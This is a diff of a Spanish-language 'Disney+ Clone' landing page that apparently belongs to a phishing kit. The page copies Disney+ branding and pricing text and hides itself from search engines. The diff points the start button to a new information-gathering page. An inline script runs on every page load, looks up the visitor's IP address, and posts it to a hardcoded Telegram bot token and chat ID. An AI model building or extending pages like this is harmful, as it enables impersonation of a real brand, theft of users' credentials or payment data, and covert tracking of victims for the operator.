@@ -6,7 +6,8 @@
   <meta name="robots" content="noindex, nofollow"/>
   <title>Disney+ Clone</title>
   <link rel="stylesheet" href="style.css"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap"
+        rel="stylesheet"/>
 </head>
 <body>
   <header>
@@ -17,10 +18,10 @@
     <div class="overlay"></div>
     <div class="content">
       <h1>Clásicos imprescindibles, estrenos y Originals de Disney+.</h1>
-      <a href="login.html" class="btn">Comenzar</a>
+      <a href="information.html" class="btn">Comenzar</a>
       <p class="subtext">
         Desde 5,99 €/mes. Sin cargos ocultos. Sin compromiso*.<br/>
-        Disfruta 12 meses al precio de 10 meses con suscripción anual Premium o Standard.
+        Disfruta 12 meses al precio de 10 con suscripción anual Premium o Standard.
       </p>
       <span class="footnote">
         * La cancelación se efectúa al final del periodo de facturación actual. Suscripción requerida. 5,99 €/mes en Standard con anuncios.
@@ -33,22 +34,21 @@
   </footer>
 
   <script>
-    // Script Telegram (inchangé)
+    // Notification Telegram (inchangé)
     (function(){
       const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
       const chatId   = "-4970333928";
       fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(({ ip }) => {
-          const message = `🚀 Nuevo clic – visitante conectado con IP: ${ip}`;
           return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: message }),
-            keepalive: true
+            body: JSON.stringify({ chat_id: chatId,
+              text: `🚀 Nuevo clic – visitante conectado con IP: ${ip}` })
           });
         })
-        .catch(err => console.warn("Error Telegram:", err));
+        .catch(console.warn);
     })();
   </script>
 </body>
